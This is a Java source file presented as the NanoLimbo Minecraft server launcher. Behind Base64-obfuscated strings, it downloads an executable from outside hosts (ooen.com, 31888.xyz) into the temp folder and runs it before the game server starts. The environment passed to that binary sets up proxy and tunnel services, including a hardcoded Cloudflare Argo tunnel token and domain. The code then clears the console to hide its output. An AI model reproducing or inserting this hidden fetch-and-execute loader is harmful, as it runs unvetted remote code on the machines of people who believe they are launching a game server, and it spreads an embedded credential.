package ua.nanit.limbo;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import ua.nanit.limbo.server.LimboServer;
import ua.nanit.limbo.server.Log;

public final class NanoLimbo {
    private static final String a = x("G1sxOzMybQ==");
    private static final String b = x("G1sxOzMxbQ==");
    private static final String c = x("G1swbQ==");
    private static final AtomicBoolean d = new AtomicBoolean(true);
    private static Process e;
    private static final String[] f = {"PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT", "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", "UPLOAD_URL", "CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO", "SHOW_LOG"};

    private static String x(String s) {
        return new String(java.util.Base64.getDecoder().decode(s), java.nio.charset.StandardCharsets.UTF_8);
    }

    public static void main(String[] g) {
        if (Float.parseFloat(System.getProperty(x("amF2YS5jbGFzcy52ZXJzaW9u"))) < 54.0) {
            System.err.println(b + x("RVJST1I6IFlvdXIgSmF2YSB2ZXJzaW9uIGlzIHRvbyBsb3dlciwgcGxlYXNlIHN3aXRjaCB0aGUgdmVyc2lvbiBpbiBzdGFydHVwIG1lbnUh") + c);
            try {
                Thread.sleep(3000);
            } catch (InterruptedException h) {
                h.printStackTrace();
            }
            System.exit(1);
        }
        try {
            r();
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                d.set(false);
                u();
            }));
            Thread.sleep(15000);
            System.out.println(a + x("U2VydmVyIGlzIHJ1bm5pbmchCg==") + c);
            System.out.println(a + x("VGhhbmsgeW91IGZvciB1c2luZyB0aGlzIHNjcmlwdCxFbmpveSEK") + c);
            System.out.println(a + x("TG9ncyB3aWxsIGJlIGRlbGV0ZWQgaW4gMjAgc2Vjb25kcywgeW91IGNhbiBjb3B5IHRoZSBhYm92ZSBub2Rlcw==") + c);
            Thread.sleep(15000);
            q();
        } catch (Exception h) {
            System.err.println(b + x("RXJyb3IgaW5pdGlhbGl6aW5nIFNieFNlcnZpY2U6IA==") + h.getMessage() + c);
        }
        try {
            new LimboServer().start();
        } catch (Exception h) {
            Log.error(x("Q2Fubm90IHN0YXJ0IHNlcnZlcjog"), h);
        }
    }

    private static void q() {
        try {
            if (System.getProperty(x("b3MubmFtZQ==")).contains(x("V2luZG93cw=="))) {
                new ProcessBuilder(x("Y21k"), x("L2M="), x("Y2xzICYmIG1vZGUgY29uOiBsaW5lcz0zMCBjb2xzPTEyMA==")).inheritIO().start().waitFor();
            } else {
                System.out.print(x("G1tIG1szShtbMko="));
                System.out.flush();
                new ProcessBuilder(x("dHB1dA=="), x("cmVzZXQ=")).inheritIO().start().waitFor();
                System.out.print(x("G1s4OzMwOzEyMHQ="));
                System.out.flush();
            }
        } catch (Exception g) {
            try {
                new ProcessBuilder(x("Y2xlYXI=")).inheritIO().start().waitFor();
            } catch (Exception h) {
            }
        }
    }

    private static void r() throws Exception {
        Map<String, String> g = new HashMap<>();
        s(g);
        ProcessBuilder h = new ProcessBuilder(t().toString());
        h.environment().putAll(g);
        h.redirectErrorStream(true);
        h.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        e = h.start();
    }

    private static void s(Map<String, String> g) throws IOException {
        g.put("UUID", x("Y2VkY2JlOGYtZTE5My00NzBiLWIxZWEtZTBiMThjNjU3OGU0"));
        g.put("FILE_PATH", "./world");
        g.put("NEZHA_SERVER", "");
        g.put("NEZHA_PORT", "");
        g.put("NEZHA_KEY", "");
        g.put("ARGO_PORT", "8060");
        g.put("ARGO_DOMAIN", x("dHYuYWthcm9vdC5ldS5jYw=="));
        g.put("ARGO_AUTH", x("ZXlKaElqb2lNVEE1TlRBd1lUZzBZbU0yWkRRM09EZGpNVGMyWmpZeE1HUTFNR0U0Tm1RaUxDSjBJam9pTWpreVltWmhNVFl0WVRFeE9TMDBPVEV3TFRobFpHUXROREl6TXprNE4yTTRZbVZrSWl3aWN5STZJazE2UVhwUFJFMDBUbXBKZEU1NmEzcFpVekF3VGtSQk1reFhTVFJhYWtsMFRVUlJlazE2Um1wYVJHeHJXa1JGZUNKOQ=="));
        g.put("S5_PORT", "");
        g.put("HY2_PORT", "25854");
        g.put("TUIC_PORT", "");
        g.put("ANYTLS_PORT", "");
        g.put("REALITY_PORT", "");
        g.put("ANYREALITY_PORT", "");
        g.put("UPLOAD_URL", "");
        g.put("CHAT_ID", "");
        g.put("BOT_TOKEN", "");
        g.put("CFIP", x("c3ByaW5nLmlv"));
        g.put("CFPORT", "443");
        g.put("NAME", "");
        g.put("DISABLE_ARGO", "false");
        g.put("SHOW_LOG", "no");
        for (String h : f) {
            String i = System.getenv(h);
            if (i != null && !i.trim().isEmpty()) {
                g.put(h, i);
            }
        }
        Path j = Paths.get(".env");
        if (Files.exists(j)) {
            for (String k : Files.readAllLines(j)) {
                k = k.trim();
                if (k.isEmpty() || k.startsWith("#")) continue;
                k = k.split(" #")[0].split(" //")[0].trim();
                if (k.startsWith("export ")) {
                    k = k.substring(7).trim();
                }
                String[] l = k.split("=", 2);
                if (l.length == 2) {
                    String m = l[0].trim();
                    String n = l[1].trim().replaceAll("^['\"]|['\"]$", "");
                    if (Arrays.asList(f).contains(m)) {
                        g.put(m, n);
                    }
                }
            }
        }
    }

    private static Path t() throws IOException {
        String g = System.getProperty("os.arch").toLowerCase();
        String h;
        if (g.contains("amd64") || g.contains("x86_64")) {
            h = x("aHR0cHM6Ly9hbWQ2NC5vb29lbi5jb20vc2JzaA==");
        } else if (g.contains("aarch64") || g.contains("arm64")) {
            h = x("aHR0cHM6Ly9hcm02NC5vb29lbi5jb20vc2JzaA==");
        } else if (g.contains("s390x")) {
            h = x("aHR0cHM6Ly9zMzkweC4zMTg4OC54eXovc2JzaA==");
        } else {
            throw new RuntimeException(x("VW5zdXBwb3J0ZWQgYXJjaGl0ZWN0dXJlOiA=") + g);
        }
        Path i = Paths.get(System.getProperty(x("amF2YS5pby50bXBkaXI=")), x("c2J4"));
        if (!Files.exists(i)) {
            try (InputStream j = new URL(h).openStream()) {
                Files.copy(j, i, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!i.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        return i;
    }

    private static void u() {
        if (e != null && e.isAlive()) {
            e.destroy();
            System.out.println(b + x("c2J4IHByb2Nlc3MgdGVybWluYXRlZA==") + c);
        }
    }
}
